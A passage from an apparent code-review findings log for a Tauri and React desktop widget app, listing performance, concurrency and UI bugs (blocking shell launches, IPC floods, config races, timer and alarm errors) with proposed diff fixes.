- **Category**: performance [lens: F1b]
- **Scenario**: When launching an executable or shortcut from the launcher widget, `launch_app_or_uri` executes `ShellExecuteW` directly on Tokio's async worker thread without offloading to `spawn_blocking`. If Windows SmartScreen, Windows Defender real-time scanning, or a UAC prompt intercepts the launch, `ShellExecuteW` blocks synchronously for 2 to 10 seconds, stalling the Tokio async runtime thread and delaying concurrent IPC commands.
- **Why**: `launch_app_or_uri` is declared `async fn`, but executes blocking Win32 shell I/O directly in the async task context rather than delegating to `tokio::task::spawn_blocking`.
- **Fix**:
```diff
--- a/src-tauri/src/launcher/mod.rs
+++ b/src-tauri/src/launcher/mod.rs
@@ -505,4 +505,5 @@ pub async fn launch_app_or_uri(target: String) -> Result<(), String> {
     validate_launch_target(&target)?;
 
+    tokio::task::spawn_blocking(move || {
     #[cfg(windows)]
     {
@@ -557,3 +558,5 @@ pub async fn launch_app_or_uri(target: String) -> Result<(), String> {
         Ok(())
     }
+    })
+    .await
+    .map_err(|e| format!("Launch task join failed: {}", e))?
```

### [MAJOR] [OPEN] M4-01 Redundant triple event-listener registration and unthrottled IPC setPosition calls flood backend during grid drag
- **Status**: OPEN
- **Where**: `src/hooks/useGridDrag.ts:331`, `src/hooks/useGridDrag.ts:468`, `src/hooks/useGridDrag.ts:509-525`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: HIGH
- **Category**: performance
- **Scenario**: When dragging any desktop widget in independent mode, moving the pointer at high mouse report rates (125Hz-1000Hz) triggers three concurrent handlers per mouse move: `document` listener (via DOM bubbling), `window` listener, and React synthetic `onPointerMove` on `<header>`. Each handler independently calculates grid collisions and calls `appWindow.setPosition` and `update_skeleton_preview` over Tauri IPC without `requestAnimationFrame` batching, generating hundreds of redundant IPC calls and Win32 `SetWindowPos` operations per second and causing noticeable UI jitter.
- **Why**: Listeners are attached to both `window` and `document` simultaneously, and `<header>` also attaches React `dragProps.onPointerMove`. None of the calls are batched or throttled to the monitor refresh rate.
- **Fix**:
```diff
--- a/src/hooks/useGridDrag.ts
+++ b/src/hooks/useGridDrag.ts
@@ -509,7 +509,4 @@
     window.addEventListener("pointermove", handleWindowPointerMove);
     window.addEventListener("pointerup", handleWindowPointerUp);
     window.addEventListener("pointercancel", handleWindowPointerUp);
-    window.addEventListener("mouseup", handleWindowPointerUp);
-    document.addEventListener("pointermove", handleWindowPointerMove);
-    document.addEventListener("pointerup", handleWindowPointerUp);
-    document.addEventListener("mouseup", handleWindowPointerUp);
@@ -519,7 +516,4 @@
       window.removeEventListener("pointermove", handleWindowPointerMove);
       window.removeEventListener("pointerup", handleWindowPointerUp);
       window.removeEventListener("pointercancel", handleWindowPointerUp);
-      window.removeEventListener("mouseup", handleWindowPointerUp);
-      document.removeEventListener("pointermove", handleWindowPointerMove);
-      document.removeEventListener("pointerup", handleWindowPointerUp);
-      document.removeEventListener("mouseup", handleWindowPointerUp);
```

### [MAJOR] [OPEN] M4-02 Missing optional chaining on config.widgets in AppContent and DockContainer causes crash on incomplete or empty config
- **Status**: OPEN
- **Where**: `src/App.tsx:301-310`, `src/components/docking/DockContainer.tsx:85-114`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: HIGH
- **Category**: bug
- **Scenario**: When configuration is loaded or reloaded with `config.widgets` omitted, null, or during partial configuration synchronization, rendering `AppContent` or `DockContainer` throws an unhandled `TypeError: Cannot read properties of undefined (reading 'resources')`, crashing the application UI.
- **Why**: Both components directly access properties on `config.widgets` (e.g. `config.widgets.resources?.visible`) without optional chaining on `config.widgets`, even though adjacent lines in the same components explicitly guard with `if (!config.widgets) return []`.
- **Fix**:
```diff
--- a/src/App.tsx
+++ b/src/App.tsx
@@ -301,10 +301,10 @@
-  const isResourcesVisible = config.widgets.resources?.visible ?? true;
-  const isSpotifyVisible = config.widgets.spotify?.visible ?? true;
-  const isWeatherVisible = config.widgets.weather?.visible ?? true;
-  const isSpeedtestVisible = config.widgets.speedtest?.visible ?? false;
-  const isLauncherVisible = config.widgets.launcher?.visible ?? false;
-  const isQuickSettingsVisible = config.widgets.quick_settings?.visible ?? false;
-  const isBluetoothVisible = config.widgets.bluetooth?.visible ?? false;
-  const isBatteryVisible = config.widgets.battery?.visible ?? false;
-  const isCalendarVisible = config.widgets.calendar?.visible ?? false;
-  const isClockVisible = config.widgets.clock?.visible ?? false;
+  const isResourcesVisible = config.widgets?.resources?.visible ?? true;
+  const isSpotifyVisible = config.widgets?.spotify?.visible ?? true;
+  const isWeatherVisible = config.widgets?.weather?.visible ?? true;
+  const isSpeedtestVisible = config.widgets?.speedtest?.visible ?? false;
+  const isLauncherVisible = config.widgets?.launcher?.visible ?? false;
+  const isQuickSettingsVisible = config.widgets?.quick_settings?.visible ?? false;
+  const isBluetoothVisible = config.widgets?.bluetooth?.visible ?? false;
+  const isBatteryVisible = config.widgets?.battery?.visible ?? false;
+  const isCalendarVisible = config.widgets?.calendar?.visible ?? false;
+  const isClockVisible = config.widgets?.clock?.visible ?? false;
--- a/src/components/docking/DockContainer.tsx
+++ b/src/components/docking/DockContainer.tsx
@@ -85,15 +85,15 @@
-    if (config.widgets.resources?.visible ?? true) {
+    if (config.widgets?.resources?.visible ?? true) {
...
-    if (config.widgets.spotify?.visible ?? true) {
+    if (config.widgets?.spotify?.visible ?? true) {
...
-    if (config.widgets.weather?.visible ?? true) {
+    if (config.widgets?.weather?.visible ?? true) {
```

### [MAJOR] [OPEN] M4-03 Multi-monitor bounding coordinate calculation corrupts virtual desktop boundaries when displays have different DPI scaling
- **Status**: OPEN
- **Where**: `src/hooks/useGridDrag.ts:169-174`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: HIGH
- **Category**: bug
- **Scenario**: In a multi-monitor setup where Display 1 is 1920x1080 at 100% scale (x=0) and Display 2 is 2880x1620 at 150% scale placed to its right (x=1920 in virtual physical space). When computing bounding coordinates, Display 2's starting coordinate (1920) is divided by 1.5, producing `left = 1280`. This causes Display 2's bounding box to overlap Display 1 (0 to 1920) in logical coordinates and restricts `boundMaxX` to 3200 instead of 3840, preventing widgets from being dragged into the right half of the secondary monitor.
- **Why**: Tauri monitor positions are in unified Windows virtual desktop physical coordinates. Dividing secondary monitor physical origin coordinates by their individual scale factor distorts the unified multi-monitor coordinate system.
- **Fix**:
```diff
--- a/src/hooks/useGridDrag.ts
+++ b/src/hooks/useGridDrag.ts
@@ -169,4 +169,4 @@
-            const left = workPos.x / mScale;
-            const top = workPos.y / mScale;
-            const right = left + workSize.width / mScale;
-            const bottom = top + workSize.height / mScale;
+            const left = workPos.x / s;
+            const top = workPos.y / s;
+            const right = left + workSize.width / s;
+            const bottom = top + workSize.height / s;
```

### [MAJOR] [OPEN] M5-01 Hardcoded 360x384px card dimensions in BatteryWidget exceed 320x360px window registry
- **Status**: OPEN
- **Where**: `src/widgets/battery/BatteryWidget.tsx:79, 101, 161, 198`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: HIGH
- **Category**: contract
- **Scenario**: When BatteryWidget is opened in a standalone desktop window, the Tauri backend creates a window sized to 320x360 (`src-tauri/src/lib.rs:71`). Because the widget container elements hardcode `w-[360px] h-[384px]`, the widget overflows the window boundaries by 40px horizontally and 24px vertically, permanently clipping off the bottom action buttons and the right margin.
- **Why**: The root `Card` wrappers for dismissed, no-battery, loading, and normal states specify explicit pixel dimensions `w-[360px] h-[384px]` rather than responsive container bounds `w-full h-full`.
- **Fix**:
```diff
--- a/src/widgets/battery/BatteryWidget.tsx
+++ b/src/widgets/battery/BatteryWidget.tsx
@@ -78,3 +78,3 @@ export const BatteryWidget: FC<BatteryWidgetProps> = ({
           className={cn(
-            "w-[360px] h-[384px] p-5 flex flex-col items-center justify-center text-center select-none text-[var(--fluent-text-secondary)]",
+            "w-full h-full p-5 flex flex-col items-center justify-center text-center select-none text-[var(--fluent-text-secondary)]",
             className
@@ -100,3 +100,3 @@ export const BatteryWidget: FC<BatteryWidgetProps> = ({
         className={cn(
-          "w-[360px] h-[384px] p-5 flex flex-col justify-between select-none relative overflow-hidden",
+          "w-full h-full p-5 flex flex-col justify-between select-none relative overflow-hidden",
           className
@@ -160,3 +160,3 @@ export const BatteryWidget: FC<BatteryWidgetProps> = ({
         className={cn(
-          "w-[360px] h-[384px] p-5 flex flex-col items-center justify-center text-center select-none",
+          "w-full h-full p-5 flex flex-col items-center justify-center text-center select-none",
           className
@@ -197,3 +197,3 @@ export const BatteryWidget: FC<BatteryWidgetProps> = ({
       className={cn(
-        "w-[360px] h-[384px] p-4 flex flex-col justify-between text-[var(--fluent-text-primary)] select-none overflow-hidden",
+        "w-full h-full p-4 flex flex-col justify-between text-[var(--fluent-text-primary)] select-none overflow-hidden",
         className
```

---

### [MAJOR] [OPEN] M5-02 Erroneous "Wird entladen" badge and projection failure on AC power without active charging
- **Status**: OPEN
- **Where**: `src/widgets/battery/BatteryWidget.tsx:290-313`, `src/types/battery.ts:87-106`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: HIGH
- **Category**: bug
- **Scenario**: A laptop is connected to AC wall power, but charging is halted because battery health conservation mode (e.g. 80% charge threshold) is enabled or the battery is at 99%. `getChargingBadgeInfo` displays "Wird entladen 🔋" with a warning badge, directly contradicting the "Netzbetrieb" footer line. Concurrently, `projection-empty` displays "—" instead of "Netzbetrieb".
- **Why**: `getChargingBadgeInfo` checks only `isCharging` and `chargePercent >= 100 && isPluggedIn`, falling back to `discharging` when `isPluggedIn` is true but `isCharging` is false. Similarly, `BatteryWidget` projections exclusively branch on `is_charging` rather than `is_plugged_in`.
- **Fix**:
```diff
--- a/src/types/battery.ts
+++ b/src/types/battery.ts
@@ -87,4 +87,11 @@ export function getChargingBadgeInfo(
   if (chargePercent >= 100 && isPluggedIn) {
     return {
       label: "Voll geladen ✓",
       type: "full",
       variant: "success",
     };
   }
+  if (isPluggedIn && !isCharging) {
+    return {
+      label: "Netzbetrieb ⚡",
+      type: "charging",
+      variant: "accent",
+    };
+  }
   if (isCharging) {
--- a/src/widgets/battery/BatteryWidget.tsx
+++ b/src/widgets/battery/BatteryWidget.tsx
@@ -290,3 +290,3 @@ export const BatteryWidget: FC<BatteryWidgetProps> = ({
               {is_charging
-                ? "Wird geladen"
+                : is_plugged_in
+                ? "Netzbetrieb"
                 : formatEstimatedMinutes(estimated_mins_to_20_percent)}
@@ -299,3 +299,3 @@ export const BatteryWidget: FC<BatteryWidgetProps> = ({
               {is_charging
-                ? "Wird geladen"
+                : is_plugged_in
+                ? "Netzbetrieb"
                 : formatEstimatedMinutes(estimated_mins_to_10_percent)}
@@ -308,3 +308,3 @@ export const BatteryWidget: FC<BatteryWidgetProps> = ({
               {is_charging || is_plugged_in
                 ? "Netzbetrieb"
                 : formatEstimatedMinutes(estimated_mins_to_empty)}
```

---

### [MAJOR] [OPEN] M5-03 Rapid volume adjustments while muted cause duplicate mute toggles and re-mute audio
- **Status**: OPEN
- **Where**: `src/hooks/useMasterVolume.ts:75-96`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: HIGH
- **Category**: concurrency
- **Scenario**: System volume is muted. User drags the volume slider up from 0% to 50%. The slider emits several rapid `setVolume` calls before React commits a re-render. Successive calls evaluate `wasMuted = isMuted` as `true` and fire multiple asynchronous `toggle_master_mute` calls. The first call unmutes the endpoint, and the second immediately re-mutes it, leaving the native audio muted.
- **Why**: `setVolume` relies on closure-captured `isMuted` React state which remains stale across synchronous drag events in the same tick. A ref is needed to synchronously record unmuting and guard against duplicate toggle invocations.
- **Fix**:
```diff
--- a/src/hooks/useMasterVolume.ts
+++ b/src/hooks/useMasterVolume.ts
@@ -36,2 +36,7 @@ export function useMasterVolume(initialVolume = 0.5, initialMuted = false): UseM
   const isMountedRef = useRef(true);
+  const isMutedRef = useRef(initialMuted);
+
+  useEffect(() => {
+    isMutedRef.current = isMuted;
+  }, [isMuted]);
@@ -77,4 +82,5 @@ export function useMasterVolume(initialVolume = 0.5, initialMuted = false): UseM
     setVolumeState(clamped);
-    const wasMuted = isMuted;
+    const wasMuted = isMutedRef.current;
     if (wasMuted && clamped > 0) {
+      isMutedRef.current = false;
       setIsMutedState(false);
     }
```

---

### [MAJOR] [OPEN] M6-01 Stopwatch Reset While Running Overwritten by Effect Cleanup
- **Status**: OPEN
- **Where**: `src/widgets/clock/ClockWidget.tsx:167-169`, `src/widgets/clock/ClockWidget.tsx:189-196`
- **Source**: `r-review` (Tier 2/3) (2026-10-27)
- **Confidence**: HIGH
- **Category**: bug
- **Scenario**: User starts the stopwatch in the Stoppuhr tab. After running for 10 seconds, the user clicks "Reset". The display resets to `00:00.00`. The user then clicks "Start" to begin a new timing. Instead of starting from zero, the stopwatch immediately resumes from 10.00 seconds.
- **Why**: `handleResetStopwatch` sets `stopwatchAccumulatedRef.current = 0` and calls `setIsStopwatchRunning(false)`. During the resulting state transition, React unmounts the active timer effect and executes its cleanup function (`stopwatchAccumulatedRef.current += performance.now() - stopwatchStartTimeRef.current`), which adds the elapsed run duration back into the accumulator after it was reset.
- **Fix**:
```diff
--- a/src/widgets/clock/ClockWidget.tsx
+++ b/src/widgets/clock/ClockWidget.tsx
@@ -153,6 +153,7 @@ export const ClockWidget: FC<ClockWidgetProps> = ({
   const stopwatchStartTimeRef = useRef<number>(0);
   const stopwatchAccumulatedRef = useRef<number>(0);
   const lastLapMsRef = useRef<number>(0);
+  const isResettingStopwatchRef = useRef<boolean>(false);
 
   useEffect(() => {
     if (!isStopwatchRunning) return;
@@ -165,7 +166,10 @@ export const ClockWidget: FC<ClockWidgetProps> = ({
 
     return () => {
       clearInterval(interval);
-      stopwatchAccumulatedRef.current += performance.now() - stopwatchStartTimeRef.current;
+      if (!isResettingStopwatchRef.current) {
+        stopwatchAccumulatedRef.current += performance.now() - stopwatchStartTimeRef.current;
+      }
+      isResettingStopwatchRef.current = false;
     };
   }, [isStopwatchRunning]);
 
@@ -188,6 +192,7 @@ export const ClockWidget: FC<ClockWidgetProps> = ({
   };
 
   const handleResetStopwatch = () => {
+    isResettingStopwatchRef.current = true;
     setIsStopwatchRunning(false);
     stopwatchAccumulatedRef.current = 0;
     lastLapMsRef.current = 0;
```

---

### [MAJOR] [OPEN] M6-02 Settings Polling Rate Sliders Fail to Persist on Modal Close and Read Stale Closure State
- **Where**: `src/pages/settings/SettingsModal.tsx:578-598`, `src/pages/settings/SettingsModal.tsx:631-651`, `src/pages/settings/SettingsModal.tsx:675-695`
- **Status**: OPEN
- **Source**: `r-review` (Tier 2/3) (2026-10-27)
- **Confidence**: HIGH
- **Category**: bug
- **Scenario**: User opens the Desktop Preferences modal, navigates to "Weather" or "Resources", adjusts the slider (e.g. CPU & RAM Refresh Interval from 1.5s to 0.5s), and immediately closes the modal using the titlebar "X" button. Upon reopening settings, the interval has reverted to 1.5s. Furthermore, clicking directly on the slider track reads the pre-click closure state in `onPointerUp`, saving the old value instead of the clicked target.
- **Why**: Slider release handlers (`onPointerUp` and `onKeyUp`) call `updateConfig` without passing `saveImmediately = true`. This puts disk writes into a 500ms debounce queue. Closing the window immediately destroys the webview (`current.destroy()`) before the debounce timer fires. Additionally, `onPointerUp` reads `localCpuRamMs` from the component closure instead of `(e.currentTarget as HTMLInputElement).valueAsNumber`.
- **Fix**:
```diff
--- a/src/pages/settings/SettingsModal.tsx
+++ b/src/pages/settings/SettingsModal.tsx
@@ -577,25 +577,29 @@ export const SettingsModal: FC = () => {
                       value={localWeatherMinutes}
                       onChange={(e) => setLocalWeatherMinutes(Number(e.target.value))}
-                      onPointerUp={() => {
+                      onPointerUp={(e) => {
+                        const val = e.currentTarget.valueAsNumber;
                         void updateConfig((prev) => ({
                           ...prev,
                           polling_rates: {
                             ...prev.polling_rates,
-                            weather_minutes: localWeatherMinutes,
+                            weather_minutes: val,
                           },
-                        }));
+                        }), true);
                         showFeedback();
                       }}
-                      onKeyUp={() => {
+                      onKeyUp={(e) => {
+                        const val = e.currentTarget.valueAsNumber;
                         void updateConfig((prev) => ({
                           ...prev,
                           polling_rates: {
                             ...prev.polling_rates,
-                            weather_minutes: localWeatherMinutes,
+                            weather_minutes: val,
                           },
-                        }));
+                        }), true);
                         showFeedback();
                       }}
@@ -630,25 +634,29 @@ export const SettingsModal: FC = () => {
                       value={localCpuRamMs}
                       onChange={(e) => setLocalCpuRamMs(Number(e.target.value))}
-                      onPointerUp={() => {
+                      onPointerUp={(e) => {
+                        const val = e.currentTarget.valueAsNumber;
                         void updateConfig((prev) => ({
                           ...prev,
                           polling_rates: {
                             ...prev.polling_rates,
-                            resources_cpu_ram_ms: localCpuRamMs,
+                            resources_cpu_ram_ms: val,
                           },
-                        }));
+                        }), true);
                         showFeedback();
                       }}
-                      onKeyUp={() => {
+                      onKeyUp={(e) => {
+                        const val = e.currentTarget.valueAsNumber;
                         void updateConfig((prev) => ({
                           ...prev,
                           polling_rates: {
                             ...prev.polling_rates,
-                            resources_cpu_ram_ms: localCpuRamMs,
+                            resources_cpu_ram_ms: val,
                           },
-                        }));
+                        }), true);
                         showFeedback();
                       }}
@@ -674,25 +682,29 @@ export const SettingsModal: FC = () => {
                       value={localDiskMs}
                       onChange={(e) => setLocalDiskMs(Number(e.target.value))}
-                      onPointerUp={() => {
+                      onPointerUp={(e) => {
+                        const val = e.currentTarget.valueAsNumber;
                         void updateConfig((prev) => ({
                           ...prev,
                           polling_rates: {
                             ...prev.polling_rates,
-                            resources_disk_ms: localDiskMs,
+                            resources_disk_ms: val,
                           },
-                        }));
+                        }), true);
                         showFeedback();
                       }}
-                      onKeyUp={() => {
+                      onKeyUp={(e) => {
+                        const val = e.currentTarget.valueAsNumber;
                         void updateConfig((prev) => ({
                           ...prev,
                           polling_rates: {
                             ...prev.polling_rates,
-                            resources_disk_ms: localDiskMs,
+                            resources_disk_ms: val,
                           },
-                        }));
+                        }), true);
                         showFeedback();
                       }}
```

---

### [MAJOR] [OPEN] M6-03 Clock Alarm Evaluates Against World Clock Timezone and Can Miss Trigger Due to 1-Second Interval Window
- **Where**: `src/widgets/clock/ClockWidget.tsx:214-220`
- **Status**: OPEN
- **Source**: `r-review` (Tier 2/3) (2026-10-27)
- **Confidence**: HIGH
- **Category**: bug
- **Scenario**: (1) User enables an alarm for `07:00`. On the "Uhr" tab, they change the timezone to "Tokio (JST)" to check foreign time. The alarm now evaluates `nowStr === alarmTime` using Tokyo time and triggers at 07:00 Tokyo time (midnight local time) instead of local system time. (2) If `setInterval(..., 1000)` drifts by even 15ms (e.g. tick at 06:59:59.980 followed by 07:00:01.010 under load), `seconds === 0` is never true and the alarm is missed completely.
- **Why**: `ClockWidget` compares `alarmTime` against `digitalTime` (which tracks the Uhr tab's selected world timezone) rather than local time. Furthermore, requiring `parseInt(digitalTime.seconds, 10) === 0` makes the trigger vulnerable to macro-task timer drift.
- **Fix**:
```diff
--- a/src/widgets/clock/ClockWidget.tsx
+++ b/src/widgets/clock/ClockWidget.tsx
@@ -207,6 +207,7 @@ export const ClockWidget: FC<ClockWidgetProps> = ({
   const [alarmLabel, setAlarmLabel] = useState<string>("Aufstehen");
   const [alarmTriggered, setAlarmTriggered] = useState<boolean>(false);
+  const lastTriggeredMinuteRef = useRef<string>("");
 
   const handleToggleAlarm = () => {
     setIsAlarmEnabled(!isAlarmEnabled);
@@ -215,8 +216,13 @@ export const ClockWidget: FC<ClockWidgetProps> = ({
 
   useEffect(() => {
     if (!isAlarmEnabled || alarmTriggered) return;
-    const nowStr = `${digitalTime.hours}:${digitalTime.minutes}`;
-    if (nowStr === alarmTime && parseInt(digitalTime.seconds, 10) === 0) {
+    const localHours = String(currentTime.getHours()).padStart(2, "0");
+    const localMinutes = String(currentTime.getMinutes()).padStart(2, "0");
+    const localNowStr = `${localHours}:${localMinutes}`;
+    const todayKey = `${currentTime.toDateString()}_${localNowStr}`;
+    if (localNowStr === alarmTime && lastTriggeredMinuteRef.current !== todayKey) {
+      lastTriggeredMinuteRef.current = todayKey;
       setAlarmTriggered(true);
     }
-  }, [digitalTime, alarmTime, isAlarmEnabled, alarmTriggered]);
+  }, [currentTime, alarmTime, isAlarmEnabled, alarmTriggered]);
```

---

### [MAJOR] [FIXED] X-ipc-concurrency-01 Systemic Read-Modify-Write (RMW) race conditions across Tauri commands bypassing `ConfigManager::update_config`
- **Status**: FIXED
- **Where**: `src-tauri/src/lib.rs:131-146`, `src-tauri/src/lib.rs:349-387`, `src-tauri/src/lib.rs:403-412`, `src-tauri/src/launcher/mod.rs:591-604`, `src-tauri/src/actions/mod.rs:141-152`, `src-tauri/src/config/mod.rs:70-82`, `src-tauri/src/tray/mod.rs:252-326`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: HIGH
- **Category**: concurrency
- **Scenario**: A user drags a desktop widget to snap it to a new grid position while simultaneously adding a custom launcher game, toggling Lock Positions in the system tray, or adding a calendar note. Because `save_widget_position`, `duplicate_quick_settings_widget`, `remove_widget_instance`, `add_custom_launcher_item`, `update_quick_settings_instance`, `set_widgets_locked`, and the tray event handlers all execute `let mut config = cm.get_config().await;`, modify that local snapshot outside of any lock, and then call `cm.save_immediate(config.clone()).await;`, whichever command saves last completely overwrites the global `AppConfig` and silently discards the other command's modifications.
- **Why**: Although `ConfigManager::update_config` is implemented specifically to prevent lost-update races by mutating configuration inside an atomic `RwLock::write` guard, multiple Tauri commands and tray handlers bypass it by performing un-synchronized read-modify-write sequences across async await boundaries.
- **Fix**:
```diff
--- a/src-tauri/src/lib.rs
+++ b/src-tauri/src/lib.rs
@@ -131,14 +131,16 @@ pub mod integration {
         if let Some(cm) = app.try_state::<ConfigManager>() {
-            let mut config = cm.get_config().await;
-            let (w, h) = if let Some(placement) = config.widgets.get_mut(&widget_id) {
-                placement.logical_x = logical_x;
-                placement.logical_y = logical_y;
-                (placement.logical_width, placement.logical_height)
-            } else {
-                (320.0, 240.0)
-            };
+            let (w, h, snapshot) = cm.update_config(|config| {
+                let (w, h) = if let Some(placement) = config.widgets.get_mut(&widget_id) {
+                    placement.logical_x = logical_x;
+                    placement.logical_y = logical_y;
+                    (placement.logical_width, placement.logical_height)
+                } else {
+                    (320.0, 240.0)
+                };
+                Ok((w, h, config.clone()))
+            }).await?;
             if let Some(wm) = app.try_state::<WindowManager>() {
                 wm.update_window_position(&widget_id, logical_x, logical_y, w, h);
             }
-            cm.save_immediate(config.clone()).await.map_err(|e| e.to_string())?;
             use tauri::Emitter;
-            let _ = app.emit("config-changed", &config);
+            let _ = app.emit("config-changed", &snapshot);
         }
--- a/src-tauri/src/launcher/mod.rs
+++ b/src-tauri/src/launcher/mod.rs
@@ -591,12 +591,15 @@ pub async fn add_custom_launcher_item<R: tauri::Runtime>(
     if let Some(cm) = app.try_state::<crate::config::ConfigManager>() {
-        let mut config = cm.get_config().await;
-        if let Some(existing) = config.launcher_items.iter_mut().find(|i| i.id == item.id) {
-            *existing = item;
-        } else {
-            config.launcher_items.push(item);
-        }
-        cm.save_immediate(config.clone())
-            .await
-            .map_err(|e| e.to_string())?;
+        let snapshot = cm.update_config(|config| {
+            if let Some(existing) = config.launcher_items.iter_mut().find(|i| i.id == item.id) {
+                *existing = item.clone();
+            } else {
+                config.launcher_items.push(item.clone());
+            }
+            Ok(config.clone())
+        }).await?;
         use tauri::Emitter;
-        let _ = app.emit("config-changed", &config);
+        let _ = app.emit("config-changed", &snapshot);
         Ok(())
```

---

### [MAJOR] [FIXED] X-ipc-concurrency-02 Unsynchronized concurrent window creation and destruction in `sync_widget_windows` triggered by un-debounced `config-changed` cascades
- **Status**: FIXED
- **Where**: `src-tauri/src/lib.rs:579-588`, `src-tauri/src/lib.rs:174-233`, `src-tauri/src/lib.rs:48-99`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: HIGH
- **Category**: concurrency
- **Scenario**: When high-frequency config changes occur (such as adding multiple notes, toggling settings, or saving widget positions), each operation emits `"config-changed"`. In `lib.rs`, `app.listen("config-changed")` unconditionally spawns an async task executing `sync_widget_windows(handle).await;`. Because there is no mutex, task cancellation, debounce, or serialized queue for `sync_widget_windows`, multiple instances run concurrently. When two concurrent sync passes check `app.get_webview_window(&label)`, neither finds the window while it is asynchronously initializing in `WebviewWindowBuilder::build()`, causing both tasks to invoke `build()` with the identical label and failing with a duplicate window creation error.
- **Why**: `app.listen("config-changed")` spawns uncoordinated concurrent instances of `sync_widget_windows` without debouncing or synchronization guards.
- **Fix**:
```diff
--- a/src-tauri/src/lib.rs
+++ b/src-tauri/src/lib.rs
@@ -578,11 +578,16 @@ pub fn run() {
             let app_handle = app.handle().clone();
             let wm_config_sync = window_manager_setup.clone();
+            let sync_mutex = std::sync::Arc::new(tokio::sync::Mutex::new(()));
             app.listen("config-changed", move |_event| {
                 let handle = app_handle.clone();
                 let wm = wm_config_sync.clone();
+                let mutex = sync_mutex.clone();
                 tauri::async_runtime::spawn(async move {
+                    let _guard = mutex.lock().await;
                     if let Ok(cfg) = load_config(handle.clone()).await {
                         wm.set_snap_to_edges(cfg.snap_to_edges);
                     }
                     let _ = sync_widget_windows(handle).await;
                 });
             });
```

---

### [MAJOR] [OPEN] X-ipc-concurrency-03 Permanent Tauri event listener leak on unmount during asynchronous listener setup in `useSpeedtest`
- **Status**: OPEN
- **Where**: `src/hooks/useSpeedtest.ts:132-180`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: HIGH
- **Category**: robustness
- **Scenario**: In React 18/19 (e.g. StrictMode mounting in development or rapid route/tab navigation), components mount and immediately unmount. Because `setupListeners()` is an asynchronous function awaiting dynamic `import("@tauri-apps/api/event")` and `listen(...)`, the effect cleanup function runs before the promises resolve while `unlistenProgress` and `unlistenConfig` are still `undefined`. When the promises resolve afterwards, the returned cleanup functions are assigned to closure variables that are never invoked, permanently leaking listener registrations in Tauri's event manager.
- **Why**: `useSpeedtest` lacks an `isDisposed` cancellation check upon promise resolution (unlike `useConfig.ts` and `useSystemMetrics.ts` which check `if (isDisposed) unlisten();`).
- **Fix**:
```diff
--- a/src/hooks/useSpeedtest.ts
+++ b/src/hooks/useSpeedtest.ts
@@ -124,15 +124,17 @@ export function useSpeedtest(options?: {
     isMountedRef.current = true;
+    let isDisposed = false;
     let unlistenProgress: (() => void) | undefined;
     let unlistenConfig: (() => void) | undefined;

     const setupListeners = async () => {
       if (!isTauri()) return;

       try {
         const { listen } = await import("@tauri-apps/api/event");
+        if (isDisposed) return;

-        unlistenProgress = await listen<SpeedtestProgress>("speedtest-progress", (evt) => {
+        const up = await listen<SpeedtestProgress>("speedtest-progress", (evt) => {
           if (!isMountedRef.current) return;
           const p = evt.payload;
@@ -158,16 +160,25 @@ export function useSpeedtest(options?: {
-        unlistenConfig = await listen<{ speedtest_history?: SpeedtestResult[] }>(
+        const uc = await listen<{ speedtest_history?: SpeedtestResult[] }>(
           "config-changed",
           (evt) => {
             if (!isMountedRef.current) return;
             if (evt.payload?.speedtest_history) {
               updateHistoryList(evt.payload.speedtest_history);
             }
           }
         );
+
+        if (isDisposed) {
+          up();
+          uc();
+        } else {
+          unlistenProgress = up;
+          unlistenConfig = uc;
+        }
       } catch (e) {
         console.error("Failed to setup speedtest listeners:", e);
       }
     };

     void setupListeners();
     void refreshHistory();

     return () => {
+      isDisposed = true;
       isMountedRef.current = false;
       if (unlistenProgress) unlistenProgress();
       if (unlistenConfig) unlistenConfig();
     };
```

---

### [MAJOR] [OPEN] X-ipc-concurrency-04 Dual competing writes and redundant IPC cascades in `QuickSettingsWidget.tsx:saveInstance`
- **Status**: OPEN
- **Where**: `src/widgets/quick-settings/QuickSettingsWidget.tsx:142-156`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: HIGH
- **Category**: concurrency
- **Scenario**: When a user changes the title or pinned actions in Quick Settings, `saveInstance` calls `await updateConfig(...)` (which serializes and saves the entire `AppConfig` via `save_config`) and immediately afterwards calls `invoke("update_quick_settings_instance", { instance: updated })` (which reads and saves via `save_immediate`). Both commands trigger disk writes and both emit `"config-changed"`. Because `save_config` (debounced) and `update_quick_settings_instance` (immediate) race against each other in Tokio, the debounced write can clobber the immediate write, and redundant `"config-changed"` events trigger duplicated window synchronization cascades.
- **Why**: `saveInstance` redundantly invokes two separate backend persistence channels (`save_config` and `update_quick_settings_instance`) for the same configuration update.
- **Fix**:
```diff
--- a/src/widgets/quick-settings/QuickSettingsWidget.tsx
+++ b/src/widgets/quick-settings/QuickSettingsWidget.tsx
@@ -141,18 +141,17 @@ export const QuickSettingsWidget: FC<QuickSettingsWidgetProps> = ({
   const saveInstance = useCallback(
     async (updated: QuickSettingsInstance) => {
-      await updateConfig((prev) => ({
-        ...prev,
-        quick_settings_instances: {
-          ...prev.quick_settings_instances,
-          [instanceId]: updated,
-        },
-      }));
-
       try {
         const { invoke } = await import("@tauri-apps/api/core");
         await invoke("update_quick_settings_instance", { instance: updated });
       } catch {
-        // Safe fallback in web or test environment
+        // Safe fallback in web or test environment
+        await updateConfig((prev) => ({
+          ...prev,
+          quick_settings_instances: {
+            ...prev.quick_settings_instances,
+            [instanceId]: updated,
+          },
+        }));
       }
     },
     [instanceId, updateConfig],
```

---

### [MAJOR] [FIXED] X-ipc-concurrency-05 Synchronous filesystem traversal, .vdf parsing, and icon I/O on Tokio worker thread in `scan_installed_games`
- **Status**: FIXED
- **Where**: `src-tauri/src/launcher/mod.rs:486-496`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: HIGH
- **Category**: performance
- **Scenario**: When the Launcher widget mounts or the user clicks refresh, `scan_installed_games` is called. Although declared as an `async fn` Tauri command, it executes `scan_steam_games()` and `scan_epic_games()` directly on Tokio's async worker thread without `tokio::task::spawn_blocking`. These functions traverse directories across multiple drive roots, parse large `.vdf` text files, enumerate manifest files, and read/base64-encode executable icon binaries from disk, freezing Tokio's worker thread for 200–800ms and stalling other async operations (such as speedtests, telemetry updates, and config saves).
